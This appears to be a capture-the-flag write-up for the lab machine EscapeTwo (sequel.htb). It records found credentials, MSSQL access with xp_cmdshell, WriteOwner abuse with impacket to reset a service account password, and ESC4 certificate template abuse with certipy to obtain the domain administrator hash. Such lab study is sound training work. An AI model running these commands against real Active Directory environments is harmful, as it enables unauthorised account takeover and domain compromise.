![image 86.png](assets/EscapeTwo/image%2086.png)
![image 1 53.png](assets/EscapeTwo/image%201%2053.png)
  
creds given:
rose:KxEPkKe6R8su
\Default\AppData\Roaming\Microsoft\Windows\SendTo
Domain Name:
sequel.htb
sequel.htb0
DNS: DC01.sequel.htb
  
![image 2 53.png](assets/EscapeTwo/image%202%2053.png)
rose can’t do anything :(
  
![image 3 46.png](assets/EscapeTwo/image%203%2046.png)
the Users share has NTUSER logs
![image 4 42.png](assets/EscapeTwo/image%204%2042.png)
  
[https://nothingcyber.medium.com/blue-team-system-live-analysis-part-11-windows-user-account-forensics-ntuser-dat-495ab41393db#:~:text=Yes%2C the NTUSER.,fantastic information about each user](https://nothingcyber.medium.com/blue-team-system-live-analysis-part-11-windows-user-account-forensics-ntuser-dat-495ab41393db#:~:text=Yes%2C%20the%20NTUSER.,fantastic%20information%20about%20each%20user).
  
This article explains how to load and read the registry file NTUSER.DAT
![image 5 41.png](assets/EscapeTwo/image%205%2041.png)
![image 6 37.png](assets/EscapeTwo/image%206%2037.png)
since the primary and secondary sequence numbers match in our file, that means it’s a clean hive
- may be a rabbit hole
  
two service accounts from kerberoasting :3
![image 7 36.png](assets/EscapeTwo/image%207%2036.png)
top one is sql_svc and bottom is ca_svc
- neither got cracked
  
was able to log into their sql server with rose’s creds
![image 8 33.png](assets/EscapeTwo/image%208%2033.png)
  
table names
![image 9 33.png](assets/EscapeTwo/image%209%2033.png)
  
in the “msdb” database, there are some interesting tables
![image 10 28.png](assets/EscapeTwo/image%2010%2028.png)
nothing in there :(
  
nothing from certipy yet (probably need ca_svc)
![image 11 27.png](assets/EscapeTwo/image%2011%2027.png)
  
all users in DC
![image 12 21.png](assets/EscapeTwo/image%2012%2021.png)
  
we missed a share called accounting department :)
found accounts.xlsx and opened that to get sql_svc password
![image 13 21.png](assets/EscapeTwo/image%2013%2021.png)
![image 14 19.png](assets/EscapeTwo/image%2014%2019.png)
sa:MSSQLP@ssw0rd!
oscar:86LxLBMgEWaKUnBG
  
the spreadsheet says that the password is for “sa” and there is an “sa” user on the sql server
![image 15 17.png](assets/EscapeTwo/image%2015%2017.png)
  
![image 16 15.png](assets/EscapeTwo/image%2016%2015.png)
- make sure when logging in with sa you get rid of “-windows-auth” at the end
  
now that were the admin on the database, we can turn on cmdshell with “xp_cmdshell”
![image 17 13.png](assets/EscapeTwo/image%2017%2013.png)
  
  
  
sql_svc:WqSZAF6CysDQbGb3
- in the SQL2019 folder
![image 18 12.png](assets/EscapeTwo/image%2018%2012.png)
ryan:WqSZAF6CysDQbGb3
- password reuse :3
  
![image 19 11.png](assets/EscapeTwo/image%2019%2011.png)
- write owner :3
  
do the following commands to exploit WriteOwner
- impacket-owneredit -action write -new-owner 'ryan' -target 'ca_svc' 'sequel.htb'/'ryan':'WqSZAF6CysDQbGb3'
- impacket-dacledit -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' 'sequel.htb'/'ryan':'WqSZAF6CysDQbGb3'
- net rpc password "ca_svc" "Password1" -U "sequel.htb"/"ryan"%"WqSZAF6CysDQbGb3" -S "dc01.sequel.htb"
  
  
doing certipy with ca_svc should give you that it’s vulnerable to ESC4
![image 20 9.png](assets/EscapeTwo/image%2020%209.png)
certipy-ad find -dc-ip 10.10.11.51 -vulnerable -stdout -u ca_svc@sequel.htb -p <password>
  
![image 21 9.png](assets/EscapeTwo/image%2021%209.png)
  
![image 22 8.png](assets/EscapeTwo/image%2022%208.png)
  
  
now that we can execute ESC4, we can get admin hash
- certipy-ad template -u ca_svc@sequel.htb -p Password1 -template DunderMifflinAuthentication -dc-ip 10.10.11.51 -save-old
- certipy-ad req -u ca_svc@sequel.htb -p 'Password1' -dc-ip 10.10.11.51 -target DC01.sequel.htb -ca sequel-DC01-CA -template DunderMifflinAuthentication -upn administrator@sequel.htb
- certipy-ad auth -pfx administrator.pfx -domain sequel.htb
![image 23 7.png](assets/EscapeTwo/image%2023%207.png)
- can login with evil-winrm with the admin hash from ESC4
![image 24 6.png](assets/EscapeTwo/image%2024%206.png)